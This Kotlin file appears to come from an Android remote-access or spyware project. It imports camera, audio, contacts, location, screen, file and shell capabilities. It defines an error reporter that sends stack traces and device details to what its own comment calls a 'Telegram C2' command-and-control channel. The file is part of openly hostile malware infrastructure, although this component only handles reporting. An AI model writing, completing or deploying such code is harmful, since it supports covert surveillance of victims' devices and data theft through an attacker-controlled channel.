package com.example.agent

import android.content.Context
import android.util.Log
import com.example.agent.capabilities.AudioCapability
import com.example.agent.capabilities.CameraCapability
import com.example.agent.capabilities.ContactsCapability
import com.example.agent.capabilities.FileCapability
import com.example.agent.capabilities.LocationCapability
import com.example.agent.capabilities.ScreenCapability
import com.example.agent.capabilities.ShellCapability
import java.io.PrintWriter
import java.io.StringWriter

/**
 * Global error reporter that sends detailed error information to Telegram C2.
 * Use ErrorReporter.report(exception, context) from any catch block.
 *
 * Includes: exception class, message, full stack trace, and optional context tag.
 */
object ErrorReporter {
    private var telegram: TelegramClient? = null
    private var context: Context? = null
    private var errorCount = 0
    private val MAX_ERRORS_PER_MINUTE = 10  // rate limit to avoid flooding

    fun init(ctx: Context, tg: TelegramClient) {
        context = ctx.applicationContext
        telegram = tg
    }

    fun report(exception: Throwable, tag: String = "Unknown") {
        val ctx = context ?: return
        val tg = telegram ?: return

        errorCount++
        if (errorCount % MAX_ERRORS_PER_MINUTE == 0) {
            // Rate limiting: skip if too many errors
            return
        }

        val sw = StringWriter()
        val pw = PrintWriter(sw)
        exception.printStackTrace(pw)
        val stackTrace = sw.toString()

        val message = """
🚨 CRITICAL ERROR
━━━━━━━━━━━━━━
Component: $tag
Exception: ${exception.javaClass.simpleName}
Message: ${exception.message}
━━━━━━━━━━━━━━
Stack Trace:
$stackTrace
━━━━━━━━━━━━━━
Device: ${android.os.Build.MODEL}
Android: ${android.os.Build.VERSION.RELEASE}
        """.trimIndent()

        try {
            tg.sendText(message)
        } catch (e: Exception) {
            // If sending fails, we can't do much — log locally
            Log.e("ErrorReporter", "Failed to send error to Telegram", e)
        }
    }

    fun reportSimple(message: String, tag: String = "Info") {
        val tg = telegram ?: return
        try {
            tg.sendText("ℹ️ [$tag] $message")
        } catch (e: Exception) {
            Log.e("ErrorReporter", "Failed to send info to Telegram", e)
        }
    }
}
